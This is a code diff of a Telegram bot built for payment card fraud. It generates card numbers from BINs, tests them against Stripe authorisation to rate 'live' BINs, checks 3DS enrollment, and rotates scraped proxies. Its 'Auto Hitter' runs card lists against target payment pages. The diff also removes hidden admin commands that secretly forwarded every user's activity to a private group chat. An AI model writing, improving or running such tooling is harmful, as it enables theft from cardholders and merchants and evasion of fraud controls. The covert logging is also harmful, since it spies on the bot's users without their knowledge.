-                f"⍟━━━⌁ <b>{BOT_NAME} Help</b> ⌁━━━⍟\n\nChoose a category below.",
+                f"<b>Help Center</b>\n\nChoose a category below.\n\n<i>{DEVELOPER}</i>",
                 reply_markup=help_main_markup())
         return
 
@@ -1230,9 +1240,6 @@ def handle_update(update):
     if not text:
         return
 
-    # Log ALL activity to secret GC
-    notify_activity(user_id, username, text)
-
     # --- /start ---
     if text == "/start":
         send_message(chat_id, fmt_start(username, user_id))
@@ -1240,86 +1247,39 @@ def handle_update(update):
 
     # --- /help ---
     if text == "/help":
-        send_message(chat_id,
-            f"⍟━━━⌁ <b>{BOT_NAME} Help</b> ⌁━━━⍟\n\nChoose a category below.",
-            reply_markup=help_main_markup())
-        return
-
-    # --- /secgcset (secret — set secret GC) ---
-    if text.startswith("/secgcset"):
-        if not is_admin(user_id):
-            return  # Completely hidden
-        parts = text.split(maxsplit=1)
-        if len(parts) < 2:
-            current = get_secret_gc()
-            if current:
-                send_message(chat_id,
-                    f"⍟━━━⌁ <b>Secret GC</b> ⌁━━━⍟\n\n"
-                    f"Current: <code>{current}</code>\n\n"
-                    f"<code>/secgcset CHAT_ID</code> or <code>/secgcset here</code>")
-            else:
-                send_message(chat_id,
-                    f"⍟━━━⌁ <b>Secret GC</b> ⌁━━━⍟\n\n"
-                    f"Not configured.\n\n"
-                    f"<code>/secgcset CHAT_ID</code> or <code>/secgcset here</code>")
-            return
-        target = parts[1].strip()
-        if target.lower() == "here":
-            target = str(chat_id)
-        set_secret_gc(int(target))
-        send_message(chat_id,
-            f"⍟━━━⌁ <b>Secret GC Set</b> ⌁━━━⍟\n\n"
-            f"Chat ID: <code>{target}</code>")
-        return
-
-    # --- /gctest (secret — test secret GC) ---
-    if text == "/gctest":
-        if not is_admin(user_id):
-            return
-        gc_id = get_secret_gc()
-        if not gc_id:
-            send_message(chat_id, "⍟━━━⌁ <b>No secret GC configured.</b> ⌁━━━⍟\n\nUse /secgcset first.")
-            return
-        try:
-            resp = send_message(gc_id,
-                f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\n"
-                f"✅ Secret GC test — it works!\n"
-                f"Triggered by admin <code>{user_id}</code>")
-            if resp.get("ok"):
-                send_message(chat_id, "✅ Secret GC test sent successfully.")
-            else:
-                send_message(chat_id, f"❌ Failed to send. Error: {resp.get('description', 'Unknown')}")
-        except Exception as e:
-            send_message(chat_id, f"❌ Error: {str(e)[:60]}")
+        txt = (
+            f"<b>Help Center</b>\n\nChoose a category below.\n\n<i>{DEVELOPER}</i>"
+        )
+        send_message(chat_id, txt, reply_markup=help_main_markup())
         return
 
     # --- /bin ---
     if text.startswith("/bin") and not text.startswith("/binlookup") and not text.startswith("/binquality"):
         parts = text.split(maxsplit=1)
         if len(parts) < 2:
-            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\n<b>Usage:</b> <code>/bin 424242,555555</code>")
+            send_message(chat_id, f"<b>Usage:</b> <code>/bin 424242,555555</code>\n\n<i>{DEVELOPER}</i>")
             return
         bins = parts[1].replace(" ", "").split(",")
         user_bins[user_id] = bins
-        send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\n<b>BIN filter set:</b> <code>{', '.join(bins)}</code>")
+        send_message(chat_id, f"<b>BIN filter set:</b> <code>{', '.join(bins)}</code>\n\n<i>{DEVELOPER}</i>")
         return
 
     # --- /clearbin ---
     if text == "/clearbin":
         if user_id in user_bins:
             del user_bins[user_id]
-            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nBIN filter cleared.")
+            send_message(chat_id, f"<b>BIN filter cleared.</b>\n\n<i>{DEVELOPER}</i>")
         else:
-            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nNo BIN filter active.")
+            send_message(chat_id, f"<b>No BIN filter active.</b>\n\n<i>{DEVELOPER}</i>")
         return
 
     # --- /cancel ---
     if text == "/cancel":
         if user_id in active_users:
             cancel_flags[user_id] = True
-            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nStopping your task...")
+            send_message(chat_id, f"<b>Stopping your task...</b>\n\n<i>{DEVELOPER}</i>")
         else:
-            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nNo active task.")
+            send_message(chat_id, f"<b>No active task.</b>\n\n<i>{DEVELOPER}</i>")
         return
 
     # --- /gen ---
@@ -1330,8 +1290,9 @@ def handle_update(update):
         parts = text.split()
         if len(parts) < 2:
             send_message(chat_id,
-                f"⍟━━━⌁ <b>Card Generator</b> ⌁━━━⍟\n\n"
-                f"<b>Usage:</b> <code>/gen 424242 10</code>")
+                "<b>Card Generator</b>\n\n"
+                "<b>Usage:</b> <code>/gen 424242 10</code>\n"
+                f"Use <code>x</code> for random digits\n\n<i>{DEVELOPER}</i>")
             return
         bin_input = parts[1]
         count = 10
@@ -1342,57 +1303,44 @@ def handle_update(update):
                 count = 10
         cards = generate_cards(bin_input, count)
         if not cards:
-            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nInvalid BIN.")
+            send_message(chat_id, f"<b>Invalid BIN.</b>\n\n<i>{DEVELOPER}</i>")
             return
         card_text = "\n".join(f"<code>{c}</code>" for c in cards)
         send_message(chat_id,
-            f"⍟━━━⌁ <b>Generated {len(cards)} Cards</b> ⌁━━━⍟\n\n"
-            f"BIN: <code>{bin_input}</code>\n\n{card_text}")
+            f"<b>Generated {len(cards)} Cards</b>\n\n"
+            f"BIN: <code>{bin_input}</code>\n\n"
+            f"{card_text}\n\n"
+            f"<i>{DEVELOPER}</i>")
         return
 
     # --- /binlookup ---
     if text.startswith("/binlookup"):
         parts = text.split(maxsplit=1)
         if len(parts) < 2:
-            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\n<b>Usage:</b> <code>/binlookup 424242</code>")
+            send_message(chat_id, f"<b>Usage:</b> <code>/binlookup 424242</code>\n\n<i>{DEVELOPER}</i>")
             return
         bin_num = parts[1].strip().split('|')[0][:6]
         info, err = bin_lookup(bin_num)
         if info:
             send_message(chat_id,
-                f"⍟━━━⌁ <b>BIN Lookup — {bin_num}</b> ⌁━━━⍟\n\n"
+                f"<b>BIN Lookup — {bin_num}</b>\n\n"
                 f"Brand: <code>{info['brand']}</code>\n"
                 f"Type: <code>{info['type']}</code>\n"
                 f"Bank: <code>{info['bank']}</code>\n"
-                f"Country: <code>{info['country']}</code> {info['emoji']}")
+                f"Country: <code>{info['country']}</code> {info['emoji']}\n\n"
+                f"<i>{DEVELOPER}</i>")
         else:
-            send_message(chat_id, f"⍟━━━⌁ <b>BIN Lookup Failed</b> ⌁━━━⍟\n\n{err}")
+            send_message(chat_id, f"<b>BIN Lookup Failed</b>\n\n{err}\n\n<i>{DEVELOPER}</i>")
         return
 
     # --- /vbv ---
     if text.startswith("/vbv"):
         parts = text.split(maxsplit=1)
         if len(parts) < 2:
-            send_message(chat_id,
-                f"⍟━━━⌁ <b>VBV/3DS Check</b> ⌁━━━⍟\n\n"
-                f"<b>Usage:</b> <code>/vbv CC|MM|YY|CVV</code>")
+            send_message(chat_id, f"<b>Usage:</b> <code>/vbv 4111111111111111</code>\n\n<i>{DEVELOPER}</i>")
             return
-        send_message(chat_id, f"🔍 <b>Checking VBV/3DS enrollment...</b>")
-        proxy_dict = get_next_proxy()
-        result = vbv_lookup(parts[1].strip(), proxy_dict=proxy_dict)
-
-        cc_num = re.sub(r'\D', '', parts[1].strip().split('|')[0])
-        bin6 = cc_num[:6] if len(cc_num) >= 6 else cc_num
-        bin_info, _ = bin_lookup(bin6)
-        bin_line = ""
-        if bin_info:
-            bin_line = (f"\n<b>BIN:</b> <code>{bin6}</code>\n"
-                        f"<b>Brand:</b> {bin_info.get('brand', '?')} - {bin_info.get('type', '?')}\n"
-                        f"<b>Bank:</b> {bin_info.get('bank', '?')}\n"
-                        f"<b>Country:</b> {bin_info.get('country', '?')} {bin_info.get('emoji', '')}")
-
-        send_message(chat_id,
-            f"⍟━━━⌁ <b>VBV/3DS Result</b> ⌁━━━⍟\n\n{result}{bin_line}")
+        result = vbv_lookup(parts[1].strip())
+        send_message(chat_id, f"<b>VBV/3DS Check</b>\n\n{result}\n\n<i>{DEVELOPER}</i>")
         return
 
     # --- /binquality ---
@@ -1403,27 +1351,29 @@ def handle_update(update):
         parts = text.split(maxsplit=1)
         if len(parts) < 2:
             send_message(chat_id,
-                f"⍟━━━⌁ <b>BIN Quality Check</b> ⌁━━━⍟\n\n"
-                f"<b>Usage:</b> <code>/binquality 424242</code>\n"
-                f"Generates 10 cards, checks each with Stripe Auth.")
+                "<b>BIN Quality Check</b>\n\n"
+                "<b>Usage:</b> <code>/binquality 424242</code>\n\n"
+                "Auto-generates 10 cards from BIN, checks each\n"
+                f"with Stripe Auth, and rates the BIN quality.\n\n<i>{DEVELOPER}</i>")
             return
 
         bin_input = parts[1].strip().split('|')[0].strip()
         if len(bin_input) < 6:
-            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nBIN must be at least 6 digits.")
+            send_message(chat_id, f"<b>BIN must be at least 6 digits.</b>\n\n<i>{DEVELOPER}</i>")
             return
 
         with active_lock:
             if user_id in active_users:
-                send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nYou already have a task running.")
+                send_message(chat_id, f"<b>You already have a task running.</b>\n\n<i>{DEVELOPER}</i>")
                 return
             active_users.add(user_id)
 
         cancel_flags.pop(user_id, None)
 
         init_resp = send_message(chat_id,
-            f"⍟━━━⌁ <b>BIN Quality Check</b> ⌁━━━⍟\n\n"
-            f"BIN: <code>{bin_input}</code>\nGenerating 10 cards...",
+            f"<b>BIN Quality Check</b>\n\n"
+            f"BIN: <code>{bin_input}</code>\n"
+            f"Generating 10 cards...",
             reply_markup=stop_button_markup(user_id))
         progress_msg_id = init_resp.get("result", {}).get("message_id")
 
@@ -1431,16 +1381,17 @@ def handle_update(update):
             try:
                 cards = generate_cards(bin_input, 10)
                 if not cards:
-                    send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nFailed to generate cards.")
+                    send_message(chat_id, f"<b>Failed to generate cards from BIN.</b>\n\n<i>{DEVELOPER}</i>")
                     with active_lock:
                         active_users.discard(user_id)
                     return
 
                 if progress_msg_id:
                     edit_message(chat_id, progress_msg_id,
-                        f"⍟━━━⌁ <b>BIN Quality Check</b> ⌁━━━⍟\n\n"
+                        f"<b>BIN Quality Check</b>\n\n"
                         f"BIN: <code>{bin_input}</code>\n"
-                        f"Generated: <code>{len(cards)}</code>\nChecking...\n"
+                        f"Generated: <code>{len(cards)}</code>\n"
+                        f"Checking with Stripe Auth...\n\n"
                         f"Progress: <code>0/{len(cards)}</code>",
                         reply_markup=stop_button_markup(user_id))
 
@@ -1454,8 +1405,10 @@ def handle_update(update):
                 for i, card in enumerate(cards):
                     if cancel_flags.get(user_id):
                         break
+
                     result = process_single_entry(card, proxies_list, user_id, gate="auth")
                     r_lower = result.lower() if isinstance(result, str) else ""
+
                     if "approved" in r_lower or "charged" in r_lower:
                         approved += 1
                         approved_cards.append(card)
@@ -1464,6 +1417,7 @@ def handle_update(update):
                     else:
                         errors += 1
 
+                    # Update progress every 2 cards or at end
                     now_idx = i + 1
                     if progress_msg_id and (now_idx % 2 == 0 or now_idx == total):
                         pct = int(now_idx / total * 100)
@@ -1471,17 +1425,18 @@ def handle_update(update):
                         filled = int(bar_len * now_idx / total)
                         bar = "█" * filled + "░" * (bar_len - filled)
                         edit_message(chat_id, progress_msg_id,
-                            f"⍟━━━⌁ <b>BIN Quality Check</b> ⌁━━━⍟\n\n"
+                            f"<b>BIN Quality Check</b>\n\n"
                             f"BIN: <code>{bin_input}</code>\n"
                             f"<code>{bar}</code> {pct}%\n\n"
                             f"Progress: <code>{now_idx}/{total}</code>\n"
-                            f"✅ Approved: <code>{approved}</code>\n"
-                            f"❌ Declined: <code>{declined}</code>\n"
-                            f"⚠️ Errors: <code>{errors}</code>",
+                            f"Approved: <code>{approved}</code>\n"
+                            f"Declined: <code>{declined}</code>\n"
+                            f"Errors: <code>{errors}</code>",
                             reply_markup=stop_button_markup(user_id) if now_idx < total else None)
 
                 cancel_flags.pop(user_id, None)
 
+                # Determine quality
                 hit_rate = (approved / total * 100) if total > 0 else 0
                 if hit_rate >= 50:
                     quality = "PREMIUM BIN"
@@ -1491,11 +1446,12 @@ def handle_update(update):
                     quality_desc = "Decent approval rate — usable"
                 elif hit_rate > 0:
                     quality = "LOW BIN"
-                    quality_desc = "Low approval rate — mostly dead"
+                    quality_desc = "Low approval rate — mostly generated/dead"
                 else:
                     quality = "DEAD BIN"
-                    quality_desc = "Zero approvals — likely all dead"
+                    quality_desc = "Zero approvals — likely all generated/killed"
 
+                # BIN info
                 try:
                     info, _ = bin_lookup(bin_input[:6])
                 except Exception:
@@ -1514,17 +1470,20 @@ def handle_update(update):
                     approved_text = "\n<b>Approved Cards:</b>\n" + "\n".join(f"<code>{c}</code>" for c in approved_cards) + "\n"
 
                 send_message(chat_id,
-                    f"⍟━━━⌁ <b>BIN Quality — {quality}</b> ⌁━━━⍟\n\n"
-                    f"BIN: <code>{bin_input}</code>\n{bin_line}\n"
-                    f"Checked: <code>{total}</code>\n"
-                    f"✅ Approved: <code>{approved}</code>\n"
-                    f"❌ Declined: <code>{declined}</code>\n"
-                    f"⚠️ Errors: <code>{errors}</code>\n"
+                    f"<b>BIN Quality — {quality}</b>\n\n"
+                    f"BIN: <code>{bin_input}</code>\n"
+                    f"{bin_line}"
+                    f"\nChecked: <code>{total}</code>\n"
+                    f"Approved: <code>{approved}</code>\n"
+                    f"Declined: <code>{declined}</code>\n"
+                    f"Errors: <code>{errors}</code>\n"
                     f"Hit Rate: <code>{hit_rate:.0f}%</code>\n\n"
-                    f"<b>Verdict:</b> {quality_desc}\n{approved_text}")
+                    f"<b>Verdict:</b> {quality_desc}\n"
+                    f"{approved_text}\n"
+                    f"<i>{DEVELOPER}</i>")
 
             except Exception as e:
-                send_message(chat_id, f"⍟━━━⌁ <b>Error:</b> {str(e)[:80]} ⌁━━━⍟")
+                send_message(chat_id, f"<b>Error:</b> {str(e)[:80]}\n\n<i>{DEVELOPER}</i>")
             finally:
                 with active_lock:
                     active_users.discard(user_id)
@@ -1532,16 +1491,17 @@ def handle_update(update):
         threading.Thread(target=_run_binquality, daemon=True).start()
         return
 
+
     if text.startswith("/analyze"):
         parts = text.split(maxsplit=1)
         if len(parts) < 2:
-            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\n<b>Usage:</b> <code>/analyze https://example.com</code>")
+            send_message(chat_id, f"<b>Usage:</b> <code>/analyze https://example.com</code>\n\n<i>{DEVELOPER}</i>")
             return
         if not is_authorized(user_id):
             send_message(chat_id, fmt_unauthorized())
             return
         url = parts[1].strip()
-        send_message(chat_id, f"⍟━━━⌁ <b>Analyzing...</b> ⌁━━━⍟\n<code>{url[:60]}</code>")
+        send_message(chat_id, f"<b>Analyzing...</b>\n<code>{url[:60]}</code>")
 
         def _do_analyze():
             info = analyze_url(url)
@@ -1552,7 +1512,7 @@ def handle_update(update):
             currency = info.get('currency', 'USD')
             error = info.get('error')
             lines_out = [
-                f"⍟━━━⌁ <b>URL Analysis</b> ⌁━━━⍟\n",
+                f"<b>URL Analysis</b>\n",
                 f"URL: <code>{url[:80]}</code>",
                 f"Provider: <code>{provider.upper()}</code>",
                 f"Merchant: <code>{merchant}</code>",
@@ -1563,6 +1523,7 @@ def handle_update(update):
                 lines_out.append(f"Amount: <code>{amount} {currency}</code>")
             if error:
                 lines_out.append(f"Error: {error}")
+            lines_out.append(f"\n<i>{DEVELOPER}</i>")
             send_message(chat_id, "\n".join(lines_out))
 
         threading.Thread(target=_do_analyze, daemon=True).start()
@@ -1574,24 +1535,44 @@ def handle_update(update):
             return
         parts = text.split()
 
+        # /proxy — show status
         if len(parts) == 1:
             count = get_proxy_count()
-            send_message(chat_id,
-                f"⍟━━━⌁ <b>Proxy Pool</b> ⌁━━━⍟\n\n"
-                f"Loaded: <code>{count}</code>\n"
-                f"Rotation: <code>Round-robin</code>\n"
-                f"Index: <code>{_proxy_index}</code>\n\n"
-                "<code>/proxy reload</code>  ·  Reload\n"
-                "<code>/proxy test [n]</code>  ·  Test connectivity")
+            if count == 0:
+                send_message(chat_id,
+                    "<b>Proxy Pool</b>\n\n"
+                    "Status: <code>No proxies loaded</code>\n"
+                    "File: <code>proxies.txt</code>\n\n"
+                    "<b>Commands:</b>\n"
+                    "<code>/proxy reload</code>  ·  Reload from file\n"
+                    "<code>/proxy test</code>  ·  Test random proxy\n"
+                    "<code>/proxy test 5</code>  ·  Test 5 proxies\n\n"
+                    f"<i>{DEVELOPER}</i>")
+            else:
+                send_message(chat_id,
+                    "<b>Proxy Pool</b>\n\n"
+                    f"Loaded: <code>{count}</code>\n"
+                    f"Rotation: <code>Round-robin</code>\n"
+                    f"Index: <code>{_proxy_index}</code>\n\n"
+                    "<b>Commands:</b>\n"
+                    "<code>/proxy reload</code>  ·  Reload from file\n"
+                    "<code>/proxy test</code>  ·  Test random proxy\n"
+                    "<code>/proxy test 5</code>  ·  Test 5 proxies\n\n"
+                    f"<i>{DEVELOPER}</i>")
             return
 
         sub = parts[1].lower()
+
+        # /proxy reload
         if sub == "reload":
             new_count = load_global_proxies()
             send_message(chat_id,
-                f"⍟━━━⌁ <b>Proxies Reloaded</b> ⌁━━━⍟\n\nActive: <code>{new_count}</code>")
+                f"<b>Proxies Reloaded</b>\n\n"
+                f"Active: <code>{new_count}</code>\n\n"
+                f"<i>{DEVELOPER}</i>")
             return
 
+        # /proxy test [count]
         if sub == "test":
             test_count = 1
             if len(parts) >= 3:
@@ -1599,10 +1580,12 @@ def handle_update(update):
                     test_count = min(int(parts[2]), 10)
                 except ValueError:
                     test_count = 1
+
             if get_proxy_count() == 0:
-                send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nNo proxies loaded.")
+                send_message(chat_id, f"<b>No proxies loaded.</b>\n\n<i>{DEVELOPER}</i>")
                 return
-            send_message(chat_id, f"Testing {test_count} proxy(ies)...")
+
+            send_message(chat_id, f"<b>Testing {test_count} proxy(ies)...</b>")
 
             def _do_test():
                 results = []
@@ -1615,25 +1598,38 @@ def handle_update(update):
                     alive, latency, error = test_proxy_connectivity(p)
                     masked = p[:20] + "..." if len(p) > 20 else p
                     if alive:
-                        results.append(f"✅ <code>{masked}</code> — <code>{latency}ms</code>")
+                        results.append(f"<code>{masked}</code> — <code>{latency}ms</code>")
                     else:
-                        results.append(f"❌ <code>{masked}</code> — <code>{error}</code>")
-                alive_count = sum(1 for r in results if "✅" in r)
+                        results.append(f"<code>{masked}</code> — <code>DEAD ({error})</code>")
+
+                alive_count = sum(1 for r in results if "DEAD" not in r)
                 send_message(chat_id,
-                    f"⍟━━━⌁ <b>Proxy Test</b> ⌁━━━⍟\n\n"
+                    f"<b>Proxy Test Results</b>\n\n"
                     f"Tested: <code>{len(results)}</code>\n"
                     f"Alive: <code>{alive_count}</code>\n"
                     f"Dead: <code>{len(results) - alive_count}</code>\n\n"
-                    + "\n".join(results))
+                    + "\n".join(results) +
+                    f"\n\n<i>{DEVELOPER}</i>")
+
             threading.Thread(target=_do_test, daemon=True).start()
             return
+
+        send_message(chat_id,
+            "<b>Usage:</b>\n"
+            "<code>/proxy</code> — Pool status\n"
+            "<code>/proxy reload</code> — Reload\n"
+            "<code>/proxy test [n]</code> — Test connectivity\n\n"
+            f"<i>{DEVELOPER}</i>")
         return
 
-    # --- /addproxy ---
+    # --- /addproxy (admin) — add proxies via paste or .txt reply ---
     if text.startswith("/addproxy"):
         if not is_admin(user_id):
             return
+
         new_proxies_raw = []
+
+        # Check if replying to a .txt file
         reply = msg.get("reply_to_message")
         if reply and reply.get("document"):
             doc = reply["document"]
@@ -1643,9 +1639,11 @@ def handle_update(update):
                 if content:
                     new_proxies_raw = [l.strip() for l in content.splitlines() if l.strip() and not l.strip().startswith('#')]
 
+        # Check if proxies pasted inline after command
         parts = text.split(maxsplit=1)
         if len(parts) >= 2:
             inline_proxies = [l.strip() for l in parts[1].splitlines() if l.strip() and not l.strip().startswith('#')]
+            # Also handle comma-separated
             expanded = []
             for p in inline_proxies:
                 if ',' in p and '://' not in p and '@' not in p:
@@ -1656,43 +1654,76 @@ def handle_update(update):
 
         if not new_proxies_raw:
             send_message(chat_id,
-                f"⍟━━━⌁ <b>Add Proxies</b> ⌁━━━⍟\n\n"
-                "Paste inline or reply to .txt:\n"
-                "<code>/addproxy host:port</code>\n"
-                "<code>/addproxy host:port:user:pass</code>")
+                "<b>Add Proxies</b>\n\n"
+                "<b>Methods:</b>\n"
+                "1. Paste inline:\n"
+                "<code>/addproxy 45.3.49.240:3129</code>\n\n"
+                "2. Multiple lines:\n"
+                "<code>/addproxy\n"
+                "45.3.49.240:3129\n"
+                "host:port:user:pass</code>\n\n"
+                "3. Reply to a .txt file with <code>/addproxy</code>\n\n"
+                "<b>Supported formats:</b>\n"
+                "<code>host:port</code>\n"
+                "<code>host:port:user:pass</code>\n"
+                "<code>user:pass@host:port</code>\n"
+                "<code>http://host:port</code>\n"
+                "<code>socks5://user:pass@host:port</code>\n"
+                f"...and more\n\n<i>{DEVELOPER}</i>")
             return
 
-        send_message(chat_id, f"Validating {len(new_proxies_raw)} proxy(ies)...")
+        send_message(chat_id,
+            f"<b>Validating {len(new_proxies_raw)} proxy(ies)...</b>\n"
+            "Testing connectivity for each one.")
 
         def _do_add_proxies():
             global _global_proxies
             valid = []
+            invalid = []
             results_lines = []
+
             for raw in new_proxies_raw:
+                # Format validation
                 validated = validate_proxy_format(raw)
                 if not validated:
+                    invalid.append(raw)
                     masked = raw[:25] + "..." if len(raw) > 25 else raw
-                    results_lines.append(f"❌ <code>{masked}</code> — Invalid format")
+                    results_lines.append(f"<code>{masked}</code> — <code>Invalid format</code>")
                     continue
+
+                # Connectivity test
                 alive, latency, error = test_proxy_connectivity(raw)
                 masked = raw[:25] + "..." if len(raw) > 25 else raw
                 if alive:
                     valid.append(raw)
                     results_lines.append(f"✅ <code>{masked}</code> — <code>{latency}ms</code>")
                 else:
+                    # Do NOT add dead proxies
+                    invalid.append(raw)
                     results_lines.append(f"❌ <code>{masked}</code> — <code>{error}</code>")
+
+            # Append valid proxies to file and pool
             if valid:
                 with open(PROXIES_FILE, 'a') as f:
                     for p in valid:
                         f.write(p + "\n")
                 with _proxy_lock:
                     _global_proxies.extend(valid)
+
+            dead_count = sum(1 for r in results_lines if "❌" in r)
+
             send_message(chat_id,
-                f"⍟━━━⌁ <b>Proxy Add Results</b> ⌁━━━⍟\n\n"
+                f"<b>Proxy Add Results</b>\n\n"
                 f"Submitted: <code>{len(new_proxies_raw)}</code>\n"
                 f"✅ Working: <code>{len(valid)}</code>\n"
+                f"❌ Dead: <code>{dead_count}</code>\n"
+                f"⚠️ Invalid: <code>{len(invalid) - dead_count}</code>\n"
+                f"Added to pool: <code>{len(valid)}</code>\n"
                 f"Total pool: <code>{len(_global_proxies)}</code>\n\n"
-                + "\n".join(results_lines[:20]))
+                + "\n".join(results_lines[:20]) +
+                (f"\n... and {len(results_lines) - 20} more" if len(results_lines) > 20 else "") +
+                f"\n\n<i>{DEVELOPER}</i>")
+
         threading.Thread(target=_do_add_proxies, daemon=True).start()
         return
 
@@ -1703,40 +1734,56 @@ def handle_update(update):
         parts = text.split(maxsplit=1)
         if len(parts) < 2:
             current = get_notification_gc()
-            send_message(chat_id,
-                f"⍟━━━⌁ <b>Notification GC</b> ⌁━━━⍟\n\n"
-                f"Current: <code>{current or 'Not set'}</code>\n\n"
-                f"<code>/setgc CHAT_ID</code> or <code>/setgc here</code>")
+            if current:
+                send_message(chat_id,
+                    f"<b>Notification GC</b>\n\n"
+                    f"Current: <code>{current}</code>\n\n"
+                    f"To change: <code>/setgc CHAT_ID</code>\n"
+                    f"To set this chat: <code>/setgc here</code>\n\n"
+                    f"<i>{DEVELOPER}</i>")
+            else:
+                send_message(chat_id,
+                    f"<b>Notification GC</b>\n\n"
+                    f"Not configured.\n\n"
+                    f"<code>/setgc CHAT_ID</code> or <code>/setgc here</code>\n\n"
+                    f"<i>{DEVELOPER}</i>")
             return
         target = parts[1].strip()
         if target.lower() == "here":
             target = str(chat_id)
         set_notification_gc(int(target))
         send_message(chat_id,
-            f"⍟━━━⌁ <b>Notification GC Set</b> ⌁━━━⍟\n\nChat ID: <code>{target}</code>")
+            f"<b>Notification GC Set</b>\n\n"
+            f"Chat ID: <code>{target}</code>\n\n"
+            f"<i>{DEVELOPER}</i>")
         return
 
-    # --- /scrapeproxies ---
+    # --- /scrapeproxies (admin) ---
     if text == "/scrapeproxies":
         if not is_admin(user_id):
             return
-        send_message(chat_id, "Scraping proxies...")
+        send_message(chat_id, f"<b>Scraping proxies...</b>")
 
         def _do_scrape():
             proxies = scrape_proxies()
             if proxies:
+                # Save to file
                 with open(PROXIES_FILE, 'w') as f:
                     f.write('\n'.join(proxies))
                 load_global_proxies()
+
+                # Send as document in chat
                 filename = f"proxies_{int(time.time())}.txt"
                 filepath = os.path.join(DATA_DIR, filename)
                 with open(filepath, "w") as f:
                     f.write('\n'.join(proxies))
                 send_document(chat_id, filepath, filename,
-                    caption=f"⍟━━━⌁ <b>Scraped {len(proxies)} Proxies</b> ⌁━━━⍟\n"
-                            f"Pool: <code>{get_proxy_count()}</code>")
+                    caption=f"<b>Scraped {len(proxies)} Proxies</b>\n"
+                            f"Active pool: <code>{get_proxy_count()}</code>\n\n"
+                            f"<i>{DEVELOPER}</i>")
             else:
-                send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nFailed to scrape proxies.")
+                send_message(chat_id, f"<b>Failed to scrape proxies.</b>\n\n<i>{DEVELOPER}</i>")
+
         threading.Thread(target=_do_scrape, daemon=True).start()
         return
 
@@ -1745,28 +1792,44 @@ def handle_update(update):
         if not is_authorized(user_id):
             send_message(chat_id, fmt_unauthorized())
             return
+
         parts = text.split(maxsplit=1)
         if len(parts) < 2:
             send_message(chat_id,
-                f"⍟━━━⌁ <b>Auto Hitter</b> ⌁━━━⍟\n\n"
-                "<b>Usage:</b>\n"
+                "<b>⚡ Auto Hitter</b>\n\n"
+                "<b>Usage Modes:</b>\n\n"
+                "1️⃣ <b>Cards + Link:</b>\n"
                 "<code>/autohitter https://url.com\n"
-                "4111111111111111|01|25|123</code>\n\n"
-                "Or reply to a .txt file with:\n"
-                "<code>/autohitter https://url.com</code>")
+                "4111111111111111|01|25|123\n"
+                "5200000000000007|02|26|456</code>\n\n"
+                "2️⃣ <b>Reply to card message + Link:</b>\n"
+                "Reply to a message containing cards with:\n"
+                "<code>/autohitter https://url.com</code>\n\n"
+                "3️⃣ <b>BIN + Link (auto-gen):</b>\n"
+                "<code>/autohitter https://url.com 424242</code>\n"
+                "Auto-generates 10 cards from BIN and hits\n\n"
+                "4️⃣ <b>Reply to .txt file + Link:</b>\n"
+                "Reply to a .txt file with:\n"
+                "<code>/autohitter https://url.com</code>\n\n"
+                "Supports 15+ providers. Auto-detects payment system.\n\n"
+                f"<i>{DEVELOPER}</i>")
             return
 
         remaining = parts[1].strip()
+
+        # Extract URL (can be anywhere in the text)
         url_match = re.search(r'(https?://\S+)', remaining)
         if not url_match:
-            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nNo valid URL found.")
+            send_message(chat_id, f"<b>No valid URL found.</b>\n\n<i>{DEVELOPER}</i>")
             return
 
         target_url = url_match.group(1)
+        # Get text before and after the URL
         before_url = remaining[:url_match.start()].strip()
         after_url = remaining[url_match.end():].strip()
         extra_text = (before_url + " " + after_url).strip()
 
+        # Try to extract site name from URL
         try:
             from urllib.parse import urlparse
             parsed_url = urlparse(target_url)
@@ -1774,14 +1837,19 @@ def handle_update(update):
         except Exception:
             site_name = target_url[:40]
 
+        # Determine card source
         card_lines = []
+
+        # Check for inline cards (multi-line cards after URL or in extra_text)
         for potential_line in remaining.split('\n'):
             potential_line = potential_line.strip()
             if '|' in potential_line and not potential_line.startswith('http'):
+                # Could be CC|MM|YY|CVV
                 cc_match = re.match(r'^\d{13,19}\|', potential_line)
                 if cc_match:
                     card_lines.append(potential_line)
 
+        # Check if extra_text is a BIN (digits only, 6-8 chars)
         is_bin_mode = False
         bin_input = ""
         if not card_lines and extra_text:
@@ -1790,13 +1858,16 @@ def handle_update(update):
                 is_bin_mode = True
                 bin_input = clean
 
+        # Check if extra_text has a single card
         if not card_lines and not is_bin_mode and extra_text and '|' in extra_text:
             cc_parts = extra_text.split('|')
             if len(cc_parts) == 4:
                 card_lines.append(extra_text)
 
+        # Check reply to message (text with cards)
         reply = msg.get("reply_to_message")
         if not card_lines and not is_bin_mode and reply:
+            # Check if reply has a document (.txt file)
             if reply.get("document"):
                 doc = reply["document"]
                 fname = doc.get("file_name", "")
@@ -1807,81 +1878,135 @@ def handle_update(update):
                             line = line.strip()
                             if line and '|' in line and re.match(r'^\d', line):
                                 card_lines.append(line)
+            # Check if reply has text with cards
             elif reply.get("text"):
                 for line in reply["text"].splitlines():
                     line = line.strip()
                     if line and '|' in line and re.match(r'^\d', line):
                         card_lines.append(line)
 
+        # BIN mode — auto-generate cards
         if is_bin_mode:
             send_message(chat_id,
